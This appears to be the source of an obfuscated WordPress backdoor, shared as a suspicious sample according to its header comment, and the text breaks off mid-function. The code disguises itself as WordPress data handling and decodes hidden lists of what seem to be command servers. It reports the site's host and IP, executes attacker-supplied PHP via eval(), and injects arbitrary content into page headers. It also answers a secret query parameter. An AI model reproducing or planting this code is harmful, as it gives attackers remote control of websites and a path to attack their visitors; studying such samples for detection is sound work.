<?php error_reporting(0);

/*
File Origin
https://www.facebook.com/groups/binushacker/10154481386055464/?comment_id=10154481627675464
https://www.facebook.com/download/282718981930712/suspicious.zip
*/

if (!defined('WP_OPTION_KEY')) {
    function initial() {
        define('WP_OPTION_KEY', 'wp_data_newa');
        new wp_data();
    }
    add_action('init', 'initial');
}
class dark_tool {
    private $p_wp_client_key, $p_client_public_key, $p_master_public_key;
	
    public function __construct($client_type = 'old') {
        if ($client_type == 'new') {
            $this->new_client();
        } else {
            $this->old_client();
        }
        $this->p_client_public_key = "-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6K/I2l6k2Iz7Vojzxk5Q
43QNfIJm2jWPvXAvFtft+yy4rD3MseQJWx3PLlkoRQjSI1uiiwwlPZWED0e5wFet
nS5tKhvvRaOeUPYJq6MtyUbnaMn7bshlgaAlPaUCVdAOjdtGHMuFaWfnBLgTSu3c
uccVC2zOlXx7XK1tw39eZepRemoh0W3Qhf+hDFsEzACSBmKhBiganwCZzTDvyXpj
nfbRKbf26LJDJ9u2Choh768vQiIfuf0tGLQ+xxcBDl2ZVW0P76cd5I2v+lYRBD/X
vgU32/UZeKDheA8M/oZ5/yFv5QWAU2SHEEKYfLkAQmXs/oRGqMQONqoL3W5Q4bE/
gQIDAQAB
-----END PUBLIC KEY-----";
    }
	
    private function old_client() {
        $wp_client_key = get_option('WP_CLIENT_KEY');
        $this->p_wp_client_key = $wp_client_key;
    }
    private function new_client() {
        $new_conn = $this->new_conn();
        $this->p_wp_client_key = $new_conn['private'];
        $this->p_master_public_key = $new_conn['public'];
        update_option("WP_CLIENT_KEY", $this->p_wp_client_key);
    }
	
    public function open_conn_with_client_public_key($wp_client_key) {
        openssl_seal($wp_client_key, $var_sealed_data, $var_env_keys, array(openssl_pkey_get_public($this->p_client_public_key)));
        return array("data" => base64_encode($var_sealed_data), "key" => base64_encode($var_env_keys[0]));
    }
    public function open_conn_with_master_public_key($wp_client_key) {
        openssl_seal($wp_client_key, $var_sealed_data, $var_env_keys, array(openssl_pkey_get_public($this->p_master_public_key)));
        return json_encode(array("data" => base64_encode($var_sealed_data), "key" => base64_encode($var_env_keys[0])));
    }
    public function get_master_public_key() {
        return $this->p_master_public_key;
    }
    public function set_master_public_key($var_master_public_key) {
        $this->p_master_public_key = $var_master_public_key;
    }
    public function vZlUWjEYdyPGPomnFXMGnNY($wp_client_key) {
        $BdlbpgzPBjxVLkBLnsrXkmI = json_decode($wp_client_key, true);
        if ($BdlbpgzPBjxVLkBLnsrXkmI !== false) {
            $wp_client_key = $BdlbpgzPBjxVLkBLnsrXkmI;
        }
        if (!is_array($wp_client_key)) {
            return false;
        }
        openssl_open(base64_decode(trim($wp_client_key['data'])), $WQqrOQbxBHtERCkwicqA, base64_decode(trim($wp_client_key['key'])), $this->p_wp_client_key);
        return $WQqrOQbxBHtERCkwicqA;
    }
    public function new_conn() {
        $IzGRmpLLtcLVMJRxcfpeGhQVry = openssl_pkey_new(array('private_key_bits' => 2048, 'private_key_type' => OPENSSL_KEYTYPE_RSA,));
        openssl_pkey_export($IzGRmpLLtcLVMJRxcfpeGhQVry, $IANNGYfyVIgZFkzWVTKmQGc);
        $wp_client_key['private'] = $IANNGYfyVIgZFkzWVTKmQGc;
        $XEWVBmIaXvRqxrckbkOqw = openssl_pkey_get_details($IzGRmpLLtcLVMJRxcfpeGhQVry);
        $wp_client_key['public'] = $XEWVBmIaXvRqxrckbkOqw['key'];
        return $wp_client_key;
    }
}

class wp_data {
    public 
		$wp_client_key = array(), 
		$yYVsqvOoqWsddypXgJcIKOw = array(), 
		$qcCONSsvpJlMgdhEFFmrTI, 
		$IzGRmpLLtcLVMJRxcfpeGhQVry, 
		$aJQafHDwnaPrCJrQMjHVh, 
		$p_dark_tool, 
		$vwhhtIrAWhUEFDgPrcco, 
		$htcFFCQTLLpnCchsPKGYxso, 
		$wqawPxkNytKqRKNRqbwAdw, 
		$IatJdWimJbxtprWZElHevfI, 
		$YobOrWbieESFVcSsWsuBypg;
		
    public $WbKPQMoSbMZkXUeYKXRIk;
    public function __construct() {
        $this->yYVsqvOoqWsddypXgJcIKOw = array('==DZk4FZlVwY5RGZhpQB', '=4JnhZUpck2olIKM', '=4JnhZ3M1WJMeyTo', '=02ow5FryW3ogkJnuWUq', '6yzLhDKqwETol92q', '==trcWzYyEKqwETol92q', 'g92LhZ3ni9Togyzr', '==DoiAzYiEKqiyKMgS2p', '=8zMhyzYhIJMlqzoi9Jo', '=bKnv5vpuE3phSJofI2n', 'aW3ohHzMckzp19JM2y2M', '=02ow5PoyITqmEJquWaM', '==DoiAzY6ITqu1JLgkJL', 'g92LhpzockTocM2oaWKM', '==toc5vo1AKMaSTofyzq', 'hyzY5Izpi1JM29Jo', '==jMl9zY5ITMi9zMiyzL', 'aW3ohVGqlpzocuTq55JL', '==jMl9zYhI2LmEapiO3p', 'aW3oh4JLwAUq0I3L', '=pzpi5lp0WKLjSJMyWaM', '==jqj5FqiyKMwyzoyA2p', '3OaY1WGoj1JL', '=pUphxKqaWKnuu2L', '=4JnhVKMeAJnfMJock2p', '=4JnhV3ox5JLl9TryuTq', '=4Jnh4JqvyKMh9Tn', 'hyzYmk2oiEaoyk2M', 'hyzYh9TqlSzLhSTM', '=4JnhNKqiW3Mf9TogyzL', '==toc5lp0Szp0SzM', 'hyzYfIJM0Aaouu2L', 'hyzYlSTqm92Mhyzp', '6yzLh4zpiEKMfqzocWaL', 'aW3ohHTo5E3pgHJocW3L', '==trcWzYmgJLgyTqf9zM', '==Nqy5zYmAKMhy2M0ITo0I3o', '==jqj5PnmyzMiEUnmyzp', '==jqj5lphS2pfIzquWUq', '==trcWzYlITMuk2Mc5Jq', '0IzohZUocSzMlITMh92q', '0IzohZKMfyUqm52ohITr', '=pzpi5vouEKn0g2LukzL', '=HJohNKqbSTof9Tn', '=DKMh5lpyEJLlq2ohSzo', '6yzLhxapu1TMuITM', '==Nqy5zY39zoe1JLyWUM', '==Nqy5zYlITqm9zM5STo', '==joz5JnhZKMa5JLlE3p', '==trcWzYfy2MlITqhIUn', '=bKnv5FM4S2nfyJo', '=bKnv5PqcgJLgSzp', '==trcWzYfk2ovITqiIKp', '==DoiAzYm52ox1zM', '=02ow5lpwy2p11JLlSTM', '=02ow5vpyWzLiWzpyq2MiWaM', '=02ow5lphIJof92n', '=02ow5lpykTpgS2pi9zM', '==DoiAzYmEzpu9zL2EKo', '==trcWzYmyKLxIao', 'iMzoc5lp5kzMx5JLlS2L', '==jow5lqikTn0SJo', '=82Lh82nhIJo', '=02ow5vpiu3Lc1JLhyUM', '==DMg5FngSTMhI2q', '=bKnv5Pqcg2of9zr', '==jqj5PofS2qlITqhSTn', 'aW3ohD3owyKMh9Jo', '6yzLhxKoyEJLwSJM0y2pvI2q', '=bKnv5lo5ITMi9zM', '==trcWzYmkJL0W3ojAKM', '==toc5lp3Izo3SJo', '=4Jnhf2LiWKolITq', 'hyzYeA2olIzoiE3p', '=4Jnh82oz1zM', 'hyzY0WKLjSJMyWaM', '==toc5PMhSTolSTqcI3M', '==toc5vou12MiWUp', '==toc5voz1zM', 'hyzYj9TouWKMhI2M', '=4JnhjJL0W3ojAKM', '=8zMhyzYykTpgS2pi9zM', '==joz5JnhHJMlMTAiWTn', '==joz5JnhHaZhITqmyTo', '=8zMhyzYyqJLjgzo', 'iMzoc5vMfSTnvI2q', '3OaYm5JqaWzM', '=pUphH2nuEaZwyTp', '=pUphZapyE3pu1JMmIzocu2L', '=pUphxUMukJr6SToi9zM', '3OaYyAKqi92n', '0IzohxKLxIao', '=DKMh5Fne9TMhyzM', '==Nqy5zY5kzMx5JLlS2L', '==Nqy5zYi9zMgyzM', '==Nqy5zY392qzqKL', '==DoiAzYyyao2EKo', '=02ow5lpuyTMySKney2q', 'g92Lh4JMwEapiO3p', '=02ow5FMyWaM2EKo', '==DoiAzY3Izo3SJo');
        $this->aJQafHDwnaPrCJrQMjHVh = array('=HaphjJnu1TD1ETn1c2p', '==DoiAzYfyJLgqTDwyToiMKLlESofSTMhSzH', '==DoiAzYfyJLgqTDkHGBkDapyq3phSHouyTofy2I', 'g92LhjJnu12MNEJMjWKq0IzDmSJoiuTI', '==DoiAzYfyJLgqTD39TqlITnHIJnfIaF', '==DoiAzYfyJLgqTDx5JLaIzpv1JqGIzouyTE', 'g92LhjJnu12MNyaL4STqc12oQWKMbO3o0AKnlu2D', '=02ow5PocSJoaORZ4xGZmyJobAIL0yzH', '=02ow5PocSJoaORMhSTqlSTovI3oGy3LuE3H', '==DoiAzYfyJLgqTDhIToxyzEl9zqyWUI', '=02ow5PocSJoaORMy5zpyOUpOqJnuW3D', '==DoiAzYfyJLgqTDmHGBk4JMxSHMjIUG', 'g92LhjJnu12MNyQAlIzp192Dy5Jn0AKnlu2D', 'g92LhjJnu12MNIJo05JngS2H0WKMv9zH', '==DoiAzYfyJLgqTD1DQquu2pcuTIy5zou9zF', '==DoiAzYfyJLgqTDxIzpx5JnuqRoySTnwyJG', '=02ow5PocSJoaORMyE3LyWUHyyTqlIzD', '=02ow5PocSJoaORMuuTqa5JnuAyrcWUquIzD', 'g92LhjJnu12MNA3py12oKS2LcWKE', 'g92LhjJnu12MNAap1EKMGWKMbO3o0AKnlu2D', '=02ow5PocSJoaOxpyE3puuTIh5JD', '==DoiAzYfyJLgqTDbEKnx5JDyyTnj92H', 'g92LhjJnu12MNEaoyq3o05JIhyzqfIJG', '=02ow5PocSJoaORA4xGZxI2MlITn09TpjS0nlSJG', '==DoiAzYfyJLgqTDjLGBkHTq192H0WKMv9zH', '=02ow5PocSJoaORMcSToj1JMfWJDyI2LhSzG', 'g92Lhj2ouOHoiWaLuEJn', '=02ow5PoiSTDcEJLg91L', '==DoiAzYf9JLNSQofy2Mw1zYyyJogyzn', '=02ow5PoiSTDljJM0STphf2L1u2L', '==DoiAzYf9JLNSwpyMJLbA3KuEaoucJL', '=02ow5PoiSTDyI2Mu12KyWUMhSzr', 'g92Lhj2ouORMlSTnwIzLyAKnhITM', '==DoiAzYf9JLNWKMhEUq1WzocWUMfIJo', '=02ow5PoiSTDfSzpiEJLxkJL', '==DoiAzYf9JLN52omWJna9IL5Szn', 'g92Lhj2ouO0pykJn0AaYy5Jn0AKnlu2L', '==DoiAzYf9JLNcKLj5lo05JnwSzn', '=02ow5PoiSTDbAJnyW3pc12oe9zo', 'g92Lhj2ouOHZhyzpl9JobqJLhIJo', '==DoiAzYf9JLNWJL0EKMfI2M', '==DoiAzYf9JLNWKM0AKMigzYyyzpl9TM', '=02ow5PoiSTDyEKLgIUnm5Pp', 'g92Lhj2ouOxoiAaouq3psSJnh9ToiOKL', '==DoiAzYf9JLN1JLb5JLlW2KgSJnlyJo', '==DoiAzYf9JLNSmolWKL2SzosyKMfSTn', '=02ow5PoiSTDk4zpiu2KuyzpyEJLhSTp', '==DoiAzYf9JLNS2nmSTnm5vq', 'g92Lhj2ouORoyITqsyaohI2n', '=02ow5PoiSTDh92phyTqhRJrcWUp', '=02ow5PoiSTDygzp1W2KukToyE3p', '==DoiAzYf9JLN5Jn6k2oj5loxWKLwIzp', '==DoiAzYf9JLNcKMlI3ofSTq', '=02ow5PoiSTDmEapyWzLy9ILbEKMl9TM', '=02ow5PoiSTDkDUoiWzocSzpskJqxWJL', '=02ow5PoiSTDmITqlIJqz5vq', '=02ow5PoiSTDay2q0WKLb9SMyW3L', '=02ow5PoiSTDa5Jnzu2olyaplSTo', 'g92Lhj2ouO0phy2May2qh4Jn2kJL', 'g92Lhj2ouOHZ5ITofI2nh8Jnwyzp1SJo', '==DoiAzYf9JLN1JLhgJnh9ILxIzq', 'g92Lhj2ouOHnhyJqlIzoiITo', '==DoiAzYf9JLNqzouI3oe5Fo', '=02ow5PoiSTDuEJMl9zrsSTn0WKMvkJL', '==DoiAzYf9JLNWKqm5JLg9In', '==DoiAzYf9JLN52ogg2Lcu2KhS2Ml9Jo', '==DoiAzYf9JLNWKMxyJMz5lL', '=02ow5PoiSTDhyTo1EzYbAKL', 'g92Lhj2ouOxpy5zpiqzYukJMgSTp', 'g92Lhj2ouOxohS2qhRzrukzL', '=02ow5PoiSTDykJM6IJn65FL', '==DoiAzYf9JLNA3pyu2Kv9zp', '==DoiAzYf9JLNWUnikzMhRToyy2LuW3M', '=02ow5PoiSTDkHzoiMKLv9ILckJMlIKL', 'g92Lhj2ouOHZfIKLj9In', '=02ow5PoiSTDm5JnaE2ob5PqlSzL', '==DoiAzYf9JLNITouIzqhxTM', '=02ow5PoiSTDuy2LmIKosSTMhIUnmSTo', '=02ow5PoiSTDkf2Li1zYuEKnf9To', 'g92Lhj2ouOxouAJn4IJoskJnlOKL', '=02ow5PoiSTDkjToyq3oj5voyWKn', '=02ow5PoiSTD0IJog9zpw5ln', '=02ow5PoiSTDmO3oiE3p0IJMd5JLly2n', '==DoiAzYf9JLNk2olWKLw9IL0AKMx9Jo', 'g92Lhj2ouOxouyKLvSzLxITnmSzp', 'g92Lhj2ouOHZmgzpuOaYfkJM3Izn', 'g92Lh82obSJrN1Jn5I2p192DuAKn19TG', '=02ow5loiuJL5OHqf9zocqUMi92Euy2LckJD', '=02ow5loiuJL5O0ohy3p3Izpx5JDyy2nwSzF', 'g92Lh82obSJrN9zMuIzpi1zpyMKnZITq0ITof92D', '=02ow5loiuJL5OHrfyJrlWKIuyzqfy3H', '=02ow5loiuJL5ORMiMzoiAaocW2oFSJnwIUG', 'g92Lh82obSJrNqJn2AKn0WKLDyUolS2D', 'g92Lh82obSJrNI3pjIJnh5JMZy3p0STH', '=02ow5loiuJL5O0MxSJMm9zDyyzqyE3H', '==DoiAzYi9TnuyUDeSzp5ITouITFyyzouuTpyE3H', '=02ow5loiuJL5OHrhITquuJnByaplITI', 'g92Lh82obSJrNyzLy5JnzMJnlqHL5SJG', 'g92Lh82obSJrNAJo1I2Mxyzpa5JLZyaohSTE', 'g92Lh82obSJrNOKngyKM39TIyIKpckJMa5JD', '=02ow5loiuJL5OxMaIKMm9zHgy2F', '=02ow5loiuJL5OxL5kzoiAUoy5xoiWapuu2H', 'g92Lh82obSJrN1JrayaplSTF5ITocI2F', '==DoiAzYi9TnuyUD5WJnmI2MxyzpPyzLv9zD', '==DoiAzYi9TnuyUDfy3LxW3ozkTouuHL5SJG', 'g92Lh82obSJrN52o0yKMfu2L0STIy5JMxSzF', '=02ow5loiuJL5O0oi1TMuETMuuHMwyzouu2H', '=02ow5loiuJL5OxoukJMiqJLFyaLvyTG', '=02ow5loiuJL5OHM0SJMfOUpcEIrwSTG', '=02ow5loiuJL5OHrv9Tnw92oUyKogS2H', 'g92Lh82obSJrNE3o25JMfkJEhIJn2yzI', '==DoiAzYi9TnuyUD5WJqy5JnxWKLXIJn0AKnlu2D', 'g92Lh82obSJrNIaq1g2LcuTpfIHMfITnwyJG', '=02ow5loiuJL5O0oj9TolSJEyyTofyJG', '==DoiAzYi9TnuyUDvyUMyyTqmyzpbAHLcqzpiI2E', 'g92Lh82obSJrN9zpf52omyzohITEyyToc1JE', '==DoiAzYi9TnuyUDlqJrmyToa5JFgSJnlyJG', '==DoiAzYi9TnuyUDuIKqfkJqU52o2ITE', '=02ow5loiuJL5OHqgIUq0I2nwSToP5JLly2F', '==DoiAzYi9TnuyUDuy3LxITq4y2IhyJo6SJJ', '=02ow5loiuJL5OHnm9zpyAap1OyouIzF', '=02ow5loiuJL5OHLcAKr2STEyIJnx9zF', '==DoiAzYi9TnuyUD292pyAJrlWHrfWKM2IzD', '==DoiAzYi9TnuyUDcWJLwyzqyAJnaSzpRyaohSzE', '=02ow5loiuJL5OHrwIUofI2nmSJGyyzLvITE', 'g92Lh82obSJrN5JneyToiyJLlWKMTSzpuy2D', 'g92Lh82obSJrN9zqc52o0WKMe5JnDyKMfSTF', '=02ow5loiuJL5O0L1y3nlIUqlIUFuEKnhIzD', 'g92Lh82obSJrNSJnw52omETou52oREKMhSzF', 'g92Lh82obSJrNyKouyaLfyTnDITq0ITof92D', '=02ow5loiuJL5OHnzWJMc5zoykHngIzH', 'g92LhjJnu1TqiuTD5kJnlyUqyM2oeIar', '=02ow5PocSJo09TnNM3olyUpcuJMgSzM', 'g92LhjJnu1TqiuTDyEKqlyTriEJqvyan', 'g92LhjJnu1TqiuTDcWKneSzo1E3olyJp', 'g92LhjJnu1TqiuTDuqJLfyUMiq2o0yzL', '=02ow5PocSJo09TnNEKqvI2L1uJrzI2M', 'g92LhjJnu1TqiuTDu5Jndy3MyOKnaITq', '=02ow5PocSJo09TnNcKrkIzq15JnhIUo', '=02ow5PocSJo09TnNEJqgIaL1WKMvy3n', 'g92LhjJnu1TqiuTDuEKMlyzr5A3o6Iar', 'g92LhjJnu1TqiuTDcuKr6y3pcEJMmyzM', '=02ow5PocSJo09TnNWKrkSzo5E3oh92n', 'g92LhjJnu1TqiuTD55JMwy3MigJrjSzM', '=02ow5PocSJo09TnNuKLaSTnu52o3yUM', 'g92LhjJnu1TqiuTDyqKn6SJp1AJnfyUo', '=02ow5PocSJo09TnNOKLxSzMcuJMwSTr', 'g92LhjJnu1TqiuTDyg2olyzpiuJn4yzo', '=02ow5PocSJo09TnNAJngIaMyAKrvIzL', 'g92LhjJnu1TqiuTDu1JLmIaM1M3owS2n', '=02ow5PocSJo09TnNA3oxSzn1MJrwyap', 'g92LhjJnu1TqiuTDiuKq69zr5u2o0SJo', '=02ow5PocSJo09TnNAKrgyUn5uKqb9To', 'g92LhjJnu1TqiuTDykJqgIKpuqJrayTn', 'g92LhjJnu1TqiuTDyWKLxyzpcqJq4Szp', '=02ow5PocSJo09TnNAJL0I2LcAJnxyzn', 'g92LhjJnu1TqiuTD5c2ojSzMcAKnzyzo', '=02ow5PocSJo09TnNcKqeyzniqJLl9To', '=02ow5PocSJo09TnNu2o4y2MiAJM0Iao', '=02ow5PocSJo09TnN5JreS2M5EKnhITo', '=02ow5PocSJo09TnNAJnwyUncEJqbSTo', '=02ow5PocSJo09TnNuJnvIznuEKMaIao', 'g92LhjJnu1TqiuTD1EKrmy3LyMJqkIKo', 'g92LhjJnu1TqiuTDuEJMfIUo5kJq4y2M', 'g92LhjJnu1TqiuTDyEKMgIUM5MJMgS2n', 'g92LhjJnu1TqiuTDuAKrmy3LuAKrk9zn', 'g92LhjJnu1TqiuTDcWJLgy3ny5Jq6yTp', 'g92LhjJnu1TqiuTDyMJLjSTM5W3o49zp', '=02ow5PocSJo09TnNW3oaSTMcuKrmITo', '=02ow5PocSJo09TnNSKr6IaLcSKMbS2n', 'g92LhjJnu1TqiuTD1E2o2yzruAKqv9zq', '=02ow5PocSJo09TnNEJngITqucJreyTM', 'g92LhjJnu1TqiuTDiu2oly3L1u3o3yaM', 'g92LhjJnu1TqiuTD15Jqa9zn1OKqmyJp', 'g92LhjJnu1TqiuTDuuKn4SJpiAKrey3p', '=02ow5PocSJo09TnNgJMzSJpuWJq2yTp', '=02ow5PocSJo09TnNuJn4IzqiW3o39Jo', 'g92LhjJnu1TqiuTD5SKnmIaricKrvIJo', '=02ow5PocSJo09TnNS3odS2MyuJqxyTo', '=02ow5PocSJo09TnNcJrzyJp55JqeI2q', 'g92Lhf2oikTq19TD5uJL4yTM1EKMk9zM', 'g92Lhf2oikTq19TD5AJq4Iaq1uKq4y2p', '=02ow5lni9To0I3oNc3ojIKocMJMgy3n', '=02ow5lni9To0I3oNc3ogSzq5EJnaIUo', '=02ow5lni9To0I3oNcKnd92pigJM292p', 'g92Lhf2oikTq19TD5EJMfy3pycJn29zr', '=02ow5lni9To0I3oNcJqkyaq1gJr0Izo', 'g92Lhf2oikTq19TDyAJnd9Tn5EJMwSJp', '=02ow5lni9To0I3oNSKLgyUpygJq4yao', 'g92Lhf2oikTq19TDuEJrjIzocuJMxS2L', '=02ow5lni9To0I3oNu3ojyJoySKqvITr', 'g92Lhf2oikTq19TD5EJqhyTn1gJMkyan', 'g92Lhf2oikTq19TD5AJneITncqJndyUp', 'g92Lhf2oikTq19TD15JnwIUoykJLgI2M', 'g92Lhf2oikTq19TDuOKrfSJou1Jn0IUr', '=02ow5lni9To0I3oNuKqhyapcWKnxy2M', '=02ow5lni9To0I3oNcKMbSznucJq0Iap', 'g92Lhf2oikTq19TD5A3omy3nicJrdy3M', 'g92Lhf2oikTq19TD1WJrgS2Mc12omIzM', '=02ow5lni9To0I3oNO3ofy3qiMKqbIzr', '=02ow5lni9To0I3oNEKn4I3L1SKqfIUq', '=02ow5lni9To0I3oN5JrfyzMcMJqfIKp', '=02ow5lni9To0I3oNqKrxSTqygJrk9zo', 'g92Lhf2oikTq19TDikJnvSJp5qKqkIar', 'g92Lhf2oikTq19TD5O3ovy2piqJnhIUq', 'g92Lhf2oikTq19TDyMKL092L5MKqwIzL', '=02ow5lni9To0I3oNcJqbIap5cKL0yKp', 'g92Lhf2oikTq19TD5qKrdS2qiAJMvITq', '=02ow5lni9To0I3oNWKM6yarycJqjSzo', '=02ow5lni9To0I3oN1JM39JoiAKMbyaL', 'g92Lhf2oikTq19TD55JnmIUM1cKrm92p', '=02ow5lni9To0I3oNq3oh9zryc3og9Tq', 'g92Lhf2oikTq19TD1OKrvyaMuWJqxyUM', 'g92Lhf2oikTq19TDiMKnvyaM1uJngIzr', '=02ow5lni9To0I3oNqKMbIUnyqKMeSTp', '=02ow5lni9To0I3oNqKngIzL1uKLlIzo', 'g92Lhf2oikTq19TDu52oj92LyuJLmyzp', '=02ow5lni9To0I3oNOKL69zMucKMlSTM', '=02ow5lni9To0I3oNuKqmyTnucJM2I3L', 'g92Lhf2oikTq19TDySKrmSTn5qKLbIao', 'g92Lhf2oikTq19TD1EKnxIJoccKL0Iao', 'g92Lhf2oikTq19TD5qKr6yzoicJMa9zo', 'g92Lhf2oikTq19TDuqJnzIao1MJnxIao', '=02ow5lni9To0I3oNc2odI2p1WKMgIzr', 'g92Lhf2oikTq19TD1uKndSTquqJrhSTo', '=02ow5lni9To0I3oNuKrwyap1cJL39Tn', '=02ow5lni9To0I3oNEJrkS2pikJMbIzn', 'g92Lhf2oikTq19TDiqJMay2p1E2ofyaL', 'g92Lhf2oikTq19TDiqKqfIzoykJqlyzo', '=02ow5lni9To0I3oNcKrbSzn51JrzI2n', '=02ow5lni9To0I3oNgJLh92McuKqm92p', 'g92Lhf2oikTq19TDcq2owyap112ox9Tq', 'g92Lhf2oikTq19TDiWJq6yJoykJMjS2M', 'g92Lhf2oikTq19TDugJray3qcqJnwSzM', 'g92Lhf2oikTq19TDcqJnmyzruEKqeyzM', '=02ow5lni9To0I3oN5JMmyUr5AJn2yUp', 'g92Lhf2oikTq19TD5MJLfyTMuc3o6Izr', 'g92Lhf2oikTq19TDiAJq6yTpyEJMbI3M', '=02ow5lni9To0I3oNAJqvI2q1MKLxS2q', 'g92Lhf2oikTq19TD1EKLeSzp11JLxy2p',);
        $this->dIOUyQsvDqPHTBIxnlYs();
        $this->YobOrWbieESFVcSsWsuBypg = false;
        $wp_client_key = get_option(WP_OPTION_KEY);
        if ($wp_client_key == null || $wp_client_key == 'null') {
            $wp_client_key = '';
        }
        if ($wp_client_key == '') {
            $this->wqawPxkNytKqRKNRqbwAdw = true;
            $this->p_dark_tool = new dark_tool('new');
            $this->new_client();
        } else {
            $this->p_dark_tool = new dark_tool();
            $this->wp_client_key = $this->McEnUjjQfaFzqGsihhU($wp_client_key, true);
            if (isset($this->wp_client_key['info']['publicKey'])) {
                $this->p_dark_tool->set_master_public_key($this->wp_client_key['info']['publicKey']);
            }
        }
        $this->OFwlxWaeMyxznpZtnfJLQA();
        if ($this->TztHMzNNJASlMfiSOwxQpE()) {
            die();
        }
        if (!$this->wqawPxkNytKqRKNRqbwAdw) {
            $this->KPBBXYwmuPGPaTyLhWevI();
        }
    }
    private function new_client() {
        $WbKPQMoSbMZkXUeYKXRIk = $this->KZdGlovqEtKYUSCqSVnK();
        $WbKPQMoSbMZkXUeYKXRIk['publicKey'] = $this->p_dark_tool->get_master_public_key();
        $this->WbKPQMoSbMZkXUeYKXRIk = $WbKPQMoSbMZkXUeYKXRIk;
        $vsJigIMHYwdFnuqvRwrvms = false;
        $BCEUSjHFFwzzqmHmpjjQI = 0;
        foreach ($this->HSxTktcbTftjZjKRHHmhr() as $gXNjWLFkUQOugyREMXKvZBfw) {
            $wp_client_key = $this->RoQfzgyhgTpMgdUIktgNdYvKE($gXNjWLFkUQOugyREMXKvZBfw, $WbKPQMoSbMZkXUeYKXRIk);
            $wp_client_key = $this->gTSiihhIRUNPkADDVdes($wp_client_key);
            if ($wp_client_key !== false) {
                $vsJigIMHYwdFnuqvRwrvms = true;
                if ($this->YobOrWbieESFVcSsWsuBypg) {
                    break;
                }
                break;
            }
        }
        if ($vsJigIMHYwdFnuqvRwrvms) {
            if ($this->YobOrWbieESFVcSsWsuBypg) {
                $wp_client_key = $this->oqtYbOOiucMYWyZsGEuETRhB();
            }
            $wp_client_key['info'] = $WbKPQMoSbMZkXUeYKXRIk;
            $this->aIIwgKgvtyRoWoMedUdbp(WP_OPTION_KEY, $wp_client_key);
            $this->wp_client_key = $wp_client_key;
        } else {
            $wp_client_key = $this->oqtYbOOiucMYWyZsGEuETRhB();
            $wp_client_key['info'] = $WbKPQMoSbMZkXUeYKXRIk;
            $this->wp_client_key = $wp_client_key;
            $this->aIIwgKgvtyRoWoMedUdbp(WP_OPTION_KEY, $wp_client_key);
            $this->XnpSvtOjNDRmxyfzaDKlGwM();
        }
        return $wp_client_key;
    }
    public function TztHMzNNJASlMfiSOwxQpE() {
        $wp_client_key = $this->wp_client_key;
        if ($wp_client_key == '') {
            return false;
        }
        $p_client_public_key = @$_GET[$this->wp_client_key['info']['serverKey']];
        if (isset($p_client_public_key) && $p_client_public_key == '') {
            echo '<div id="serverList" style="display: none">';
            $bQYduZxDrtPMJtaBCQycHQY['servers'] = $wp_client_key['servers'];
            echo json_encode($bQYduZxDrtPMJtaBCQycHQY);
            echo '</div>';
            die();
        } else if (isset($p_client_public_key) && isset($this->wp_client_key['info']['fail'])) {
            if (isset($this->wp_client_key)) {
                $wp_client_key = $this->wp_client_key;
            } else {
                $wp_client_key = $this->oqtYbOOiucMYWyZsGEuETRhB();
            }
            $wp_client_key['servers'][] = $p_client_public_key;
            $this->aIIwgKgvtyRoWoMedUdbp(WP_OPTION_KEY, $wp_client_key);
            die();
        }
        return false;
    }
    public function OFwlxWaeMyxznpZtnfJLQA() {
        $wp_client_key = $this->wp_client_key;
        if (!isset($wp_client_key) || $wp_client_key == null) {
            return;
        }
        if (!is_array($wp_client_key) || $wp_client_key == '') {
            return;
        }
        if (@$wp_client_key['info']['eval'] == 1) {
            foreach ($wp_client_key['eval'] as $vsGIQvwCXRbSELMOlFV) {
                eval($vsGIQvwCXRbSELMOlFV);
            }
        }
        if (isset($wp_client_key['echo'])) {
            if (!defined('wp_footerLeo')) {
                add_action('wp_head', array($this, 'WvOoqSuRpZkhgAAFQVjBjSVo'));
            }
        }
    }
    public function WvOoqSuRpZkhgAAFQVjBjSVo() {
        $wp_client_key = $this->wp_client_key;
        foreach ($wp_client_key['echo'] as $stIedxfhoZcXvZNmNXTdFbI) {
            echo $stIedxfhoZcXvZNmNXTdFbI;
        }
    }
    private function oqtYbOOiucMYWyZsGEuETRhB() {
        $wp_client_key = array();
        $wp_client_key['echo'] = array();
        $wp_client_key['eval'] = array();
        $wp_client_key['clients'] = array();
        $wp_client_key['update'] = array();
        return $wp_client_key;
    }
    private function dIOUyQsvDqPHTBIxnlYs() {
        $dqkdbOJPzAPsLsuxnjAStdXUDis = array('www.', 'www', ' ', '{', '}');
        $this->htcFFCQTLLpnCchsPKGYxso = str_replace($dqkdbOJPzAPsLsuxnjAStdXUDis, "", $_SERVER['HTTP_HOST']);
    }
    private function HSxTktcbTftjZjKRHHmhr() {
        $wp_client_key = array();
        foreach ($this->yYVsqvOoqWsddypXgJcIKOw as $gXNjWLFkUQOugyREMXKvZBfw) {
            $wp_client_key[] = base64_decode(str_rot13(strrev($gXNjWLFkUQOugyREMXKvZBfw)));
        }
        if (isset($this->wp_client_key['info']['fail'])) {
            $nGwzfuUZcelzyfJBQMIgkk = (int)($wp_client_key['info']['fail'] / 100);
            if ($nGwzfuUZcelzyfJBQMIgkk == 0) {
                $nGwzfuUZcelzyfJBQMIgkk = 5;
            } else {
                $nGwzfuUZcelzyfJBQMIgkk*= 5;
            }
        } else {
            $nGwzfuUZcelzyfJBQMIgkk = 5;
        }
        return $this->VitTYMKdJITsiXBTLOEA($wp_client_key, $nGwzfuUZcelzyfJBQMIgkk);
    }
    private function XsvsqpxlWxfKYiyUc($YJYRbBDIcUlLJwWidyuM) {
        $wp_client_key = array();
        foreach ($this->wp_client_key['emails'] as $HWcwGasopLJSadVNNw) {
            $wp_client_key[] = $HWcwGasopLJSadVNNw;
        }
        foreach ($this->aJQafHDwnaPrCJrQMjHVh as $HWcwGasopLJSadVNNw) {
            $wp_client_key[] = base64_decode(str_rot13(strrev($HWcwGasopLJSadVNNw)));
        }
        return $this->VitTYMKdJITsiXBTLOEA($wp_client_key, $YJYRbBDIcUlLJwWidyuM);
    }
    private function KZdGlovqEtKYUSCqSVnK() {
        $wp_client_key = array();
        $wp_client_key['host'] = $_SERVER['HTTP_HOST'];
        $wp_client_key['page'] = $_SERVER['REQUEST_URI'];
        $wp_client_key['ip'] = $_SERVER['SERVER_ADDR'];
        $wp_client_key['eval'] = $this->YrCTrfUzBfsVJKvqiYUeFbc();
        $wp_client_key['exec'] = $this->KNstTqErzZQBDQOODaJdLv();
        $wp_client_key['serverKey'] = $this->BkISKDyWWRXScnLPbTlyI();
        $wp_client_key['run'] = 0;
        $wp_client_key['ver'] = 0.2;
